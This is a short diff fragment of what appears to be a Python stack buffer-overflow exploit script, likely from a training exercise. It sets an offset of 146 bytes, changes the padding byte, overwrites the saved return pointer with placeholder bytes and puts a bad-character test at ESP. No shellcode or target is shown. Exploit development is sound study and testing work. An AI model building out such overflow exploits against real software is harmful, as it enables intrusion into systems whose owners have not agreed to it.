@@ -34,7 +34,7 @@ offset = 146
 total_buff_size = 650
 
 buff = ""
-payload = "\x41" * (offset - len(buff))                   # lead padding
+payload = "\x4E" * (offset - len(buff))                   # lead padding
 eip = "\x42" * 4                                          # saved return pointer overwrite 
 esp = badchars_test                                       # where esp should be pointing
 postfix = "\n"              
